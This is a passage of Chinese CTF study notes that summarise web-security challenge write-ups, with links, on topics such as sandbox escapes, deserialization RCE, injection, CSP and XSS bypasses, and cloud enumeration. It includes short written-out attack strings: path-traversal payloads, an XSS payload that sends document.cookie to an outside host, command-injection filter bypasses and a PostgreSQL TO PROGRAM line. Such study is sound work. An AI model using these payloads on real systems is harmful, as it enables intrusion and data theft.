- vm2沙盒逃逸。参考 https://github.com/snowflakedb/snowflake-connector-nodejs/issues/571 ， poc： https://gist.github.com/leesh3288/f693061e6523c97274ad5298eb2c74e9
- 注意proxy-agent内部使用了vm2。如果可以控制proxyUrl参数，就能用`pac+data`协议注入payload并实现vm2沙盒逃逸，执行任意代码
355. [GetHub](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#gethub---web-easy)
- [gitPython RCE](https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858)
- 其他解法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#gethub
356. [Nine-One-Sixteen](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#nine-one-sixteen-warmup)
- RFC9116中指定了security.txt，里面可能藏有flag
357. [Protecting Camp](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#protecting-camp)
- [nodejs parse-url SSRF](https://security.snyk.io/vuln/SNYK-JS-PARSEURL-2936249)
358. [Sparky](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#sparky---web-easy)
- apache spark command injection: https://github.com/HuskyHacks/cve-2022-33891
359. [YSON](https://gist.github.com/mlashley/3f2fbadd307a43a40a8e69e0e83052e7#yson)
- PyYamal反序列化RCE。可供使用的payload： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#yson
360. [Zdir](https://github.com/opabravo/security-writeups/blob/main/ctf/2023-10-27%20Fetch%20The%20Flag%202023.md#zdir)
- [zdir 3.2.0 file upload to RCE](https://github.com/helloxz/zdir/issues/90)
361. [Ominous](https://github.com/opabravo/security-writeups/blob/main/ctf/2023-10-27%20Fetch%20The%20Flag%202023.md#ominous)
- [OMI RCE](https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-omi)
362. [Common Nginx misconfigurations](https://blog.detectify.com/industry-insights/common-nginx-misconfigurations-that-leave-your-web-server-ope-to-attack/)
363. [CRLF](https://i.geri.dev/6dce57c6d31ef535ae42da6b88c973.pdf)
- 可通过注入使dos2unix将某个文件从不可访问的地方拷贝至可访问的地方： https://gtfobins.github.io/gtfobins/dos2unix/
- 当flask的run里的debug选项为True时，若文件内引用的外部库或是文件本身发生变化，都会自动重启。利用这点可以对dependency进行投毒
- sudo下的dosbox利用： https://gtfobins.github.io/gtfobins/dosbox/
364. [Silent Cartographer](https://snyk.io/blog/snyk-fetch-the-flag-ctf-2023-writeup-silent-cartographer/)
- Covenant C2 framework 0.5以前的版本默认使用同样的JWT secret key，可以参考[exp](https://www.exploit-db.com/exploits/51141)实现RCE。注意这个exp随机选择8000以上的端口进行绑定，如果题目环境不允许也可以修改源码使其强制绑定到某个端口
365. [GeoGuessy](https://www.xanhacks.xyz/p/lakectf2023-geoguessy/)
- `<%=`和`<%-`的区别： https://stackoverflow.com/questions/11024840/ejs-versus 。前者转义html，后者不转
- domPurify不会过滤`<a>`标签
- js的geolocation api获取用户坐标时，会提示用户尝试获取权限。由`puppeteer`操控的机器人则需要看其Chrome profile设置的`geolocation`权限是什么
- 可以在iframe标签里`allow="geolocation *"`，即可在任意orgin获取定位
- 其他wp： https://siunam321.github.io/ctf/LakeCTF-Quals-23/web/GeoGuessy/
366. [OpenBio 2](https://zimzi.substack.com/p/cakectf-openbio-2)
- python bleach库也是净化html的一个库，过滤`<script>`和`<img>`不过类似`<strong>`之类无害的tag。里面有个linkify函数可以自动生成链接，`a.co&`可以使其生成十倍长的字符串
- 对已净化后的字符串截断并拼接上其他字符串是较为危险的做法
367. [AdBlog](https://www.youtube.com/watch?v=vXTltxDRNbM)
- DOM Clobbering。js可以根据某个标签的id来获取那个标签,[setTimeout](https://developer.mozilla.org/en-US/docs/Web/API/setTimeout)可以根据标签来执行内部的代码。如：
```html
<a id=showOverlay href="cid:function a() {console.log(`a`)}a()"></a>
<script>
    setTimeout(showOverlay, 1000);
</script>
```
控制台会输出a。也可以参考官方wp的做法，用eval： https://github.com/theoremoon/cakectf2023-public/tree/master/web/adblog

368. [My Music](https://ctftime.org/writeup/38300)
- burpsuite设置可以勾选`only show in-scope items`以及`filter by MIME type`下的其他文件类型。前者帮助过滤非目标之外的请求，后者让bp拦截更多类型的请求
- [Server Side XSS (Dynamic PDF)](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf)：应用不过滤用户输入就将其制成pdf，则攻击者可以注入js代码实现文件读取
- 当可以控制page.pdf的[options](https://pptr.dev/api/puppeteer.pdfoptions)时，可以注入path选项将pdf输出到任意用户指定的路径
- express middleware。下面这段逻辑是有问题的：
```js
try {
    userData = JSON.parse(userData);
    if (userData.isAdmin !== true) {
        res.status(403);
        res.send("Only admins can view this page");
        return;
    }
} catch (e) {
    console.log(e);
}
next();
```
当JSON.parse报错时，会进入catch分支，然后直接next，从而绕过if的检查admin权限逻辑
- 视频wp： https://www.youtube.com/watch?v=JetPydd3ud4
369. [GlacierCoin](https://themj0ln1r.github.io/posts/glacierctf23)
- solidity blockchain Reentrancy attack
- `(msg.sender).call`会调用msg.sender的fallback()函数。用receive()也行： https://github.com/Brivan-26/GlacierCTF2k23-SmartContracts-writeups
- forge script使用
370. [GlacierVault](https://themj0ln1r.github.io/posts/glacierctf23)
- solidity blockchain [delegatecall使用](https://medium.com/@ajaotosinserah/mastering-delegatecall-in-solidity-a-comprehensive-guide-with-evm-walkthrough-6ddf027175c7)。简单来说，假设合约A使用delegatecall调用合约B的某个方法C，则执行方法C时内部所使用的storage是合约A而不是B的。也就是，本来方法C内部修改的是合约B的某些字段，假设在D处；但使用delegatecall后，实际修改的storage是合约A在D处的内存
- 其他wp： https://github.com/Brivan-26/GlacierCTF2k23-SmartContracts-writeups?tab=readme-ov-file#02---glaciervault
371. [ChairLift](https://themj0ln1r.github.io/posts/glacierctf23)
- solidity blockchain erecover的特殊情况。erecover的函数签名如下：`ecrecover(digest, v, r, s)`，用于恢复签名者的地址。当v，r和s都是0时，会恢复出address(0)（这种情况表示签名invalid，代码中应该有检查签名是否valid然后revert的逻辑）
- 其他wp： https://github.com/Brivan-26/GlacierCTF2k23-SmartContracts-writeups?tab=readme-ov-file#03---chairlift
372. [Glacier Exchange](https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/web/Glacier_Exchange)
- python的浮点数有一些特殊值：inf，nan等，都大于任何实际上的数字。而且python里的浮点数也是有溢出的
373. [Peak](https://github.com/4n86rakam1/writeup/tree/main/GlacierCTF_2023/web/Peak)
- 将xss代码藏入jpg图片从而绕过CSP。工具： https://github.com/4n86rakam1/xss_injection_in_jpeg
- xxe读本地文件
374. https://www.youtube.com/watch?v=Marqe2SEYok
- 原型链污染+xss。主要使用的媒介是旧版本有漏洞的jQuery+google reCAPTCHA。相关payload：
    - https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/recaptcha.md
    - https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md
- 在原型链污染时注意一点，如果网站本身已经设置了一个值，后续污染prototype就没用了。比如：
```js
window.recaptcha=true;
```
就算污染prototype为false，这个属性还是true。因为子物体设置的属性优先级要比prototype高。如果这个window.recaptcha是undefined就能污染了
- domain名严格来说应该以`.`结尾。在domain后自己加个`.`不会影响网站的访问。注意此时js访问document.domain时末尾也会有个点
- 可以污染chrome自带的Sanitizer()的config来允许某些标签（config内部记录了不会被过滤的标签）
375. [gatecrash](https://gist.github.com/JonasProgramz/2e92d2c7d95284cab066208128167017)
- nim Httpclient header CRLF注入： https://consensys.io/diligence/vulnerabilities/nim-httpclient-header-crlf-injection/ 。若攻击者可以控制newHttpClient的userAgent，即可注入CRLF，插入自己想要的攻击payload。注意`Content-Length`要匹配插入的payload的长度
- sql注入insert语句，往数据库里插入任意数据
376. [Phantomfeed](https://blog.bi0s.in/2023/12/16/Web/Phantomfeed-HTBUniversityCTF2023/)
- 当flask的`app.run`里选择了`threaded=True`，有可能可以利用条件竞争
- 当攻击者可以完全控制 `bot.get("http://127.0.0.1:5000" + link)` 中的link，即可将bot重定向至任意网站。比如link写`@example.com`，拼接后再访问，bot就会被导向至example.com。同是127.0.0.1但是不一样的端口也可以：如link写 `@127.0.0.1:3000/phantomfeed` bot就会访问`127.0.0.1:3000/phantomfeed`
- flask网站的response的默认Content-Type是`text/html`。如果能影响flask网站的response，将response换为html即可实现xss
- python reportlab模块RCE漏洞： https://github.com/c53elyas/CVE-2023-33733
- 其他wp：
    - https://jorianwoltjer.com/blog/p/ctf/htb-university-ctf-2023/phantom-feed ：使用[ffuf](https://github.com/ffuf/ffuf)实现条件竞争。另外注意python有GIL，在匹配正则时不会执行任何代码，于是不能利用正则延长竞争窗口。但是今天看[官方wp](https://github.com/hackthebox/uni-ctf-2023/tree/main/uni-ctf-2023/web/%5BHard%5D%20PhantomFeed)，又说可以用reDos……不太懂谁对。另外，官方wp里提到了nuxt的重定向漏洞： https://github.com/nuxt/nuxt/issues/9992 ，用三个斜线即可将用户重定向到任意网站
377. [Nexus Void](https://blog.bi0s.in/2023/12/15/Web/NexusVoid-HTBUniversityCTF20232023/)
- c# .NET反序列化RCE。只要`JsonConvert.DeserializeObject`的`JsonSerializerSettings`不是`TypeNameHandling.None`，都有漏洞的风险。利用方式和php的差不多，在源码内部找要序列化成的类/gadget即可
- c#里面`false.ToString()`是`False`，与false不同
- 拼接sql语句导致的sql注入
- 其他wp：
    - https://jorianwoltjer.com/blog/p/ctf/htb-university-ctf-2023/nexus-void ：`_configuration`可以在`appsettings.json`里找对应内容
378. 路径穿越相关payload
- `/robot/../flag/.`
- `..././flag`
- `././flag`
- `/robot/../flag/ss/..`
- `/flag/ss/..`
- `/robot/../flag/..`
- `/robot/..././flag/.../.`
- `flag/.`
379. [pocket-app](https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#pocket-app) 
- pocketbase js SDK使用
380. [Warmup](https://github.com/rixinsc/ctf-writeups/blob/master/wgmy2023.md#warmup---web)
- 利用chrome调试前端混淆js代码逻辑。可用api： https://developer.chrome.com/docs/devtools/console/utilities?hl=zh-cn#debug-function
- 文件包含漏洞：php filter的利用。如果黑名单禁掉了一些关键词，可以用某些较为冷门的filter，比如wp使用的zlib.deflate。完整filter目录： https://www.php.net/manual/en/filters.php 。另一篇[wp](https://d0ublew.github.io/posts/wgmy2023/web/warmup/)更清晰地展示了如何利用PHP PEARCMD从文件包含到getshell。参考 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#lfi-to-rce-via-php-pearcmd
381. [Pet Store Viewer](https://github.com/rixinsc/ctf-writeups/blob/master/wgmy2023.md#pet-store-viewer)
- python中的格式化字符串漏洞。若str.format执行之前str本身包含用户可控制的内容，则可以注入出全局变量等内容
- python格式化字符串漏洞参考链接：
    - https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/
    - https://lucumr.pocoo.org/2016/12/29/careful-with-str-format/
    - https://security.stackexchange.com/questions/238338/are-there-any-security-concerns-to-using-python-f-strings-with-user-input/239661
    - https://podalirius.net/en/articles/python-format-string-vulnerabilities/
382. [My First AI Project](https://github.com/4n86rakam1/writeup/tree/main/Wargames.MY_2023_CTF/WEB/My_First_AI_Project)
- python pickle反序列化漏洞。不仅是最明显的pickle.load会触发这类漏洞，`numpy.load(file, allow_pickle=True)`也会。另一个[wp](https://github.com/rixinsc/ctf-writeups/blob/master/wgmy2023.md#my-first-ai-project)所使用的payload利用了shutil库复制文件
383. [Truco](https://github.com/4n86rakam1/writeup/tree/main/Wargames.MY_2023_CTF/WEB/Truco)
- 若php处于版本小于等于7.4.21的开发版本服务器（PHP Development Server <= 7.4.21），则可以通过向php文件发送特殊的GET请求来获取该文件的源码。参考 https://blog.projectdiscovery.io/php-http-server-source-disclosure/ 。若使用bp发送请求，需要关闭Update Content-Length
- php的extract函数可用于覆盖变量的值，如`_POST[func]`
384. [Status](https://github.com/4n86rakam1/writeup/tree/main/Wargames.MY_2023_CTF/WEB/Status)
- 利用文件包含漏洞进行Kubernetes信息收集
    - 从/etc/hosts中收集后端的机器名（pod running on a Kubernetes (k8s) cluster）
    - 获取Service Account Token（参考 https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Kubernetes ）。获取token后，可以用nmap扫出Kubernetes的api端口（常用步骤见 https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/pentesting-kubernetes-services  ）
    - 参考 https://cloud.hacktricks.xyz/pentesting-cloud/kubernetes-security/kubernetes-enumeration ，利用api端口获取information about the Deployment named `<name>` and its related resources
    - kubectl本地使用参考 https://d0ublew.github.io/posts/wgmy2023/web/status/
- Nginx Alias Misconfiguration。下面的配置：
```
      location /static {
        alias       /usr/share/nginx/html/;
        add_header  Cache-Control "private, max-age=3600";
      }
```
可以用`/static../foo.txt`绕过，进而访问`/usr/share/nginx`下的文件。参考 https://labs.hakaioffsec.com/nginx-alias-traversal/
385. [Secret](https://d0ublew.github.io/posts/wgmy2023/web/secret/)
- kubernetes+[HashiCorp Vault](https://zhuanlan.zhihu.com/p/30983205)。可下载[工具](https://developer.hashicorp.com/vault/install#Linux)并设置环境变量VAULT_ADDR为vault的地址然后尝试登录
- 有些时候vault内保存的密码等敏感内容会被inject进kubernetes（参考 https://developer.hashicorp.com/vault/tutorials/kubernetes/kubernetes-sidecar ）。这时候文件可直接在`/vault/secrets`目录下读取
386. [Report Google?](https://blog.rockhouse.dev/2023/12/20/wargames-my-2023/)
- `https://www.google.com/amp/`后跟任意支持amp的网站即可实现重定向。另一种利用google重定向的方法参考 https://isc.sans.edu/diary/How+Malware+Campaigns+Employ+Google+Redirects+and+Analytics/19843 。后一种做法需要获取某个网站的usg内容，但是这个东西没法算，可以利用邮件让google生成后抄下来。其他参考链接： https://news.sophos.com/en-us/2020/05/15/how-scammers-abuse-google-searchs-open-redirect-feature/ ， https://github.com/aszx87410/blog/issues/87 ， https://vicevirus.github.io/posts/report-google-wgmy-2023/
- 无括号xss payload：`<svg/onload=location=/\test.com/+document.cookie>`
387. [tsh-go](https://github.com/CykuTW/tsh-go):go语言写的小型网站后门
388. [Armoured-notes](https://github.com/Pratham1812/ctf-writeups/tree/master/BackdoorCTF2023/armoured-notes)
- nodejs vite transformIndexHtml xss[漏洞](https://github.com/vitejs/vite/security/advisories/GHSA-92r3-m2mg-pj97?cve=title)。transformIndexHtml的使用方法为`transformIndexHtml(url,template)`，其中url为请求时的url。若该url未做过滤，攻击者可直接在该页面上获取xss（无关渲染的template）
389. [BabyBlackJack](https://github.com/n0kto/ctf-writeups/tree/main/BackdoorCTF/BabyBlackJack)
- solidity有关`block.number`的知识：one block contains one transaction which can contain multiple call (with all the same block number)
390. [Rocket Explorer](https://ireland.re/posts/Backdoor_CTF_2023_Web/#webrocket-explorer)
- 若Spring Boot Actuator泄露(POST `/actuator/env`能得到内容，详细参考 https://spaceraccoon.dev/remote-code-execution-in-three-acts-chaining-exposed-actuators-and-h2-database/ 和 https://0xn3va.gitbook.io/cheat-sheets/framework/spring/spring-boot-actuators#spring.datasource.hikari.connection-test-query )，攻击者可获取RCE。payload： https://github.com/spaceraccoon/spring-boot-actuator-h2-rce
391. [VulnChain](https://github.com/n0kto/ctf-writeups/tree/main/BackdoorCTF/VulnChain),[wp](https://oboembus.tech/blog/backdoor-ctf)
- 一个比较奇怪的题型，要求`ERC721InvalidSender`被调用。这个函数根据[源码](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC721/ERC721.sol)，当`_mint` token时某个tokenId的previousOwner不为0时调用。即不能mint之前出现过的tokenId
- 使用Foundry获取被释放的合约地址
392. [ERaaS](https://lenoctambule.dev/post/nitectf-2023-eraas)/[CaaS](https://lenoctambule.dev/post/nitectf-2023-caas)/[caas_renewed](https://heckintosh.github.io/competitions/nitectf2023/)
- 命令注入技巧：可以用`$()`提前获取命令的输出
- 可以将\`\`或者`$()`放在两个字母之间，起到绕过某些多字母过滤词的作用，如en\`\`v。若`.`被过滤，可以用`${ls -a | sed '2q;d'}`获取`..`，配合cd就能去到任意的上级目录
- 可用`pwd|c'u't${IFS}-c1`获取字符`/`
- 其他做法：
    - https://github.com/satoki/ctf_writeups/tree/master/niteCTF_2023/caas_renewed ：利用base64绕过黑名单
    - https://github.com/daffainfo/ctf-writeup/tree/main/2023/niteCTF%202023/caas%20renewed :命令之间加`$@`不会影响命令执行
    - https://github.com/Cryptonite-MIT/niteCTF-2023/tree/main/web/caas_renewed ：`${PWD%%[a-z]*}`获取`/`，用`?`匹配可能命令
393. [LiteLibrary v2](https://github.com/Cryptonite-MIT/niteCTF-2023/tree/main/web/litelibrary_v2)
- openlibrary JSONP端口利用。若题目允许注入html但CSP限制了default-src为`openlibrary.org`，可以用iframe的srcdoc配合openlibrary的JSONP绕过
394. [Jay’s Bank](https://ireland.re/posts/UofTCTF_2024/#webjays-bank)
- `İ`本身在js里的长度为1，经过`toLowerCase()`函数后其长度会变为2。其他拥有类似特性的unicode字符： https://design215.com/toolbox/utf8-4byte-characters.php
- sql里定义table里的字段时也会定义最长长度，超过这个长度的内容会被截断，不会被录入数据库
395. [Advanced JSON Cutifier](https://seall.dev/posts/mapnactf2024#webadvanced-json-cutifier-74-solves)
- [go-jsonnet](https://github.com/google/go-jsonnet)库文件读取语法：
    - `(importstr "filepath") % { foo: "bar" }`
396. [Gimme-Content-Type](https://gist.github.com/parrot409/61822d4b55f335bae5aaeba6938ef52b)
- 利用pdf实现xss。chrome里的pdf由pdfium渲染，可在pdf里插入js代码，可绕过CSP。不过不能做类似fetch之类的东西，pdfium有自己的api。类似思路： https://portswigger.net/research/portable-data-exfiltration
- CSP `sec-fetch-mode=navigate`限制了无法使用script标签只能考虑frames和`window.open()`。Cookies若为None则表示iframe navigations contain cookies
397. [Fluxx](https://colleirose.github.io/influxdb-injection-nosql-injection-knightctf-2024)
- [InfluxDB NoSQL盲注](https://rafa.hashnode.dev/influxdb-nosql-injection)
398. [LordGPT](https://hackmd.io/@vow/HyNTcwSqp)
- 如果登录Microsoft账号时发现url包含`/oauth2/v2.0/`，且发现登录时报错`Selected user account does not exist in tenant ...`，可以将登录url中的tenant部分改为common，就可以用任意账号登录，而不仅仅局限于某个特定tenant的账号了
- [snowflake ID](https://abheist.com/blogs/twitter-snowflake-for-unique-ids)预测：获取多个seed后，可以得到Machine ID，再配合machine sequence ID就可以预测未来的id生成
- [nOAuth Microsoft Azure AD Vulnerability](https://www.descope.com/blog/post/noauth)：攻击者可自行注册一个Microsoft Azure账号，并修改账号的email为受害者的邮箱，这样登录时两者账号会被合并，即可登录上受害者的账号
399. [Hello from API GW](https://ctf.edwinczd.com/2024/tetctf-2024/hello-from-api-gw)
- js eval读文件payload。有些时候可以通过读环境变量来获取有关AWS的配置
- AWS相关渗透所需命令，及工具[enumerate-iam](https://github.com/andresriancho/enumerate-iam)（用于列举AWS IAM登录凭证对应的权限）的使用
400. [Microservices](https://ctf.edwinczd.com/2024/tetctf-2024/microservices)
- cloud AWS渗透（获取RCE及泄漏敏感信息）
401. [X Et Et](https://hackmd.io/@Solderet/HJ52F9496)
- js electron RCE。若electron内`new BrowserWindow`时设置了`sandbox: false`和`contextIsolation: false`，就能利用原型链污染获取RCE。类似技巧见 https://github.com/maple3142/My-CTF-Challenges/tree/master/HITCON%20CTF%202023/Harmony#rce-using-client-side-prototype-pollution
402. [Stress Release Service](https://medium.com/@s4r7h4k/7-characters-php-tetctf-2024-5f43ee0c7293)
- 利用7个非字母数字的字符在php内实现eval内代码执行。wp内列举了几个phpfuck相关的网站，不过这类网站给出的payload通常较长。php内可以将字符串看作函数执行：`'function_name'()`，所以可以利用这个特点加上异或获取字符执行任意代码
- 类似题及参考链接：
    - https://ctftime.org/writeup/36079
    - https://github.com/b-viguier/PhpFk
    - https://www.cnblogs.com/hetianlab/p/14143480.html 。利用里面提到的最后一种方法的wp： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#stress-release-service
403. Nepxion/Discovery[漏洞](https://securitylab.github.com/advisories/GHSL-2022-033_GHSL-2022-034_Discovery/)：SpEL注入以及SSRF
404. [ChatterBox](https://vozec.fr/writeups/chatterbox-realworld-ctf-2024/)
- PostgreSQL sql注入
    - PostgreSQL可以用`$`创建字符串，参考 https://www.postgresql.org/docs/8.1/sql-syntax.html 中的`4.1.2.2`，如`$tag$u$tag$`在查询语句里和`"u"`一致。利用这个符号可以创造出小写有效但大写无效的sql语句:`$u$foo$U$ a $U$bar$u$`，小写情况下`$u$`会被看作tag，得到字符串`"foo$U$ a username=$U$bar"`；大写情况下`$U$`会被看作tag，结果就不一样了
    - 可以在查询内容后添加`::json`，将内容强制转换为json。若报错即可爆出内容。超过7个字符的内容需要用substr
    - 利用query_to_xml和十六进制编码绕过过滤并实现任意文件读取；利用query_to_xml+lo_from_bytea+lo_export实现任意文件写入
    - pg_ls_dir可用于列举目录
- java thymeleaf模板注入获取RCE
- 其他wp/解法/sql注入或模板注入payload：
    - https://github.com/mmm-team/public-writeups/tree/main/rwctf2024/chatterbox ：
        - `COPY (SELECT '') TO PROGRAM '/readflag';--`可以执行`/readflag`，以及一些PostgreSQL sql语句构造技巧
        - 可以利用字符串拼接绕过[JSql](https://jsqlparser.sourceforge.net/)的AST过滤
        - 利用thymeleaf SSTI+postgres实现RCE，参考 https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce-to-program
    - https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#chatterbox
405. [SafeBridge](https://chovid99.github.io/posts/real-world-ctf-2024/)
- 两个blockchain网络之间无法通信，需要借助bridge来在两者之间传输资源。遇见的第一个环境内有多个blockchain的题目
- foundry CLI工具使用+如何创建自己的简易token并deploy。注意自己的token若想给别的合约使用需要调用approve函数
- 其他wp（使用solidity+forge）：
    - https://github.com/iczc/rwctf-6th-safebridge/tree/main/project/script
    - https://github.com/Kaiziron/real-world-ctf-6th-writeups
    - https://hodl.page/entry/RealWorldCTF-2023-blockchainsafebridge
406. [minioday](https://github.com/mmm-team/public-writeups/tree/main/rwctf2024/minioday)
- minio CVE-2023-28434漏洞利用，可在minio服务器上执行任意代码
- 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#minioday
407. [another-csp](https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/)
- 在iframe的sandbox全开（无法使用script标签），csp `defeault-src 'none'`（禁止引入任何外部资源），不能执行任何JavaScript，也无法透过meta重新导向的情况下leak同网页下的token。因css开了unsafe-inline，加上可以得知bot正在访问的网页是否关闭，故利用html+css使Chromium崩溃（相关[issue](https://issues.chromium.org/issues/41490764)）或使网页载入变慢，进而加快/拖慢bot的执行时间
- 利用dns-prefetch绕过CSP的详细介绍/相关链接： https://www.cse.chalmers.se/research/group/security/pdf/data-exfiltration-in-the-face-of-csp.pdf ， https://github.com/w3c/webappsec-csp/issues/542
- 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#another-csp
408. [safestlist](https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/#webx2fsafestlist-2-solves)
- 浏览器对网址长度有限制，可以利用一些特殊格式构造长的url：`http://${'a'.repeat(1000000)}}:pwd@localhost:3000`，其中那些a为用户名，pwd为密码，尝试对localhost:3000执行验证。过长的重定向后会触发错误，新打开的界面为`about:blank`
409. [burnbin](https://blog.huli.tw/2024/02/12/dicectf-2024-writeup/#webx2fburnbin-1-solve)
- 若上传的文件名为`.png`，在旧版的fastify static中就不会有mime type
- 利用dom clobbering修改document.defaultView使得react渲染攻击者指定的页面，从而在任意页面注入HTML跟CSS
- chrome connection pool利用
- 利用meta标签的connect-src CSP阻止请求
410. [Calculator](https://learn-cyber.net/writeup/Calculator)
- typescript中，假如某个函数只允许返回某个特定类型，可以将其他类型cast成any来绕过。例如只允许返回number类型，用`"a" as any`即可绕过类型检查，返回a
- typescript的ESLint可以用注释绕过：`/* eslint-disable-line */`。加了这句注释的ts代码不会被eslint检查
- 有助于理解typescript类型的文章： https://medium.com/free-code-camp/typescript-and-its-types-f509d799947d#14d9
- 其他解法（此题目标为让单句代码通过eval返回xss payload）： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#calculator-1
411. [calculator-2](https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003#Web-135-calculator-2-33-solves)
- 类似Calculator，但是禁止加注释和使用as与any。解法是利用eval覆盖函数，使返回的数字类型实际上是字符串（更详细内容参考 https://one3147.tistory.com/77 ）
- 利用window.name缩短xss payload长度
- 其他解法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#calculator-2 ，Calculator的其他解法中也有部分可适用于这道题
412. [floordrop](https://hodl.page/entry/DiceCTF-2024-Quals-floordropblockchain)
- (完全看不懂)solidity blockchain frontrunning。唯一明白的点是提高gas price让服务器先执行我们要的函数再执行其他函数。作者还提到了一个bomb的概念，用bomb将一个block内所有的gas消耗完毕，剩下的调用会推迟到下一个block执行
413. [Simple WAF](https://github.com/abdoghazy2015/CTF-Write-Ups/tree/main/0xL4ughCTF2024/Web/Simple%20WAF)
- php preg_match在执行失败时会返回false。可以用`phpinfo()`查看php pcre的匹配上限，超过上限后便会匹配失败
414. [DisLaugh](https://omakmoh.me/dislaugh/)
- 用ElectronJS搭建的程序源代码可在`resources/app.asar`拿到。可用工具[asar](https://github.com/electron/asar)从该后缀文件中提取源代码
- jquery的`jQuery.append()`不能用于未经过滤的用户输入，有xss的风险
- 极小xss payload： https://trustedsec.com/blog/cross-site-smallish-scripting-xsss
- 若js脚本内部nodeIntegration的值为true，意味着“Integrate Node.js features to be accessible directly from your page scripts”
415. [JWT Decoder](https://domdom.tistory.com/492)
- 小于3.1.7版本的ejs有RCE漏洞（需获取原型链污染）： https://security.snyk.io/vuln/SNYK-JS-EJS-2803307 ，但是根据这篇wp，似乎在调用ejs.render时直接传入object也可以触发
- [cookie-parser](https://www.npmjs.com/package/cookie-parser)特性:In addition, this module supports special "JSON cookies". These are cookie where the value is prefixed with `j:`. When these values are encountered, the value will be exposed as the result of JSON.parse. If parsing fails, the original value will remain. 以`j:`开头的cookie将会以parse后的json对象形式返回
416. [jason-web-token](https://hackmd.io/@vow/rJrgz1xn6)
- python的float计算缺陷（Floating point type confusion）。任何数与python里的float上限`1.8e+308`相加都会返回inf
- python里的int_parsing_size错误：当整数过大时，将其转为字符串会报错。这题的预期解正是利用这点尝试猜测出x+b中x的值（b可控），见 https://www.youtube.com/watch?v=DQ9yLCdmt-s 的介绍
417. [Filters](../../CTF/ShaktiCTF/ShaktiCTF.md)
- 绕过php对eval输入的过滤并执行系统命令/读文件
418. [Flaglang](https://github.com/uclaacm/lactf-archive/tree/main/2024/web/flaglang)
- yaml中，NO可被看作是布尔值。yaml里还有很多奇怪的布尔值表示，参考 https://www.bram.us/2022/01/11/yaml-the-norway-problem/
419. [empty execution](https://github.com/tahdjao/writeup/blob/main/braekerctf/empty_execution_en.md)
- 不使用`/`和`..`的命令注入
- 其他做法： https://gist.github.com/C0nstellati0n/248ed49dea0accfef1527788494e2fa5#empty-execution
420. [stuffy](https://github.com/tahdjao/writeup/blob/main/braekerctf/stuffy_en.md)
- python `http.request`请求走私（request smuggling）。重点在于不要让用户控制`http.request`的header名和内容以及请求内容